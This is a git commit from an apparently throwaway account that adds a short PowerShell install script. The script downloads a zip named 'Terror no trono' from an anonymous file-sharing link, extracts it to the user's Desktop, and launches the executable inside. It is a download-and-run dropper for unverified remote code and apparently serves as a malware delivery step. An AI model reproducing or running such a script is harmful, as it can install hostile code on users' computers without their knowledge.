edcac435268a890d684872fceb7f3dee654fcbca
zslfgkdghjklswdf <120216371+zslfgkdghjklswdf@users.noreply.github.com>
2023-09-28 18:18:37 -0300

    Add files via upload

---
+++ install.ps1
@@ -0,0 +1,9 @@
+# Import the required modules
+import-module PowerShellGet
+import-module Archive
+# Download the Terror no trono.zip file
+Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" -OutFile "$env:USERPROFILE\Desktop\Terror no trono.zip"
+# Extract the Terror no trono.zip file
+Expand-Archive -Path "$env:USERPROFILE\Desktop\Terror no trono.zip" -DestinationPath "$env:USERPROFILE\Desktop\Terror no trono"
+# Execute the Terror no trono.exe file
+Start-Process -FilePath "$env:USERPROFILE\Desktop\Terror no trono\Terror no trono.exe"
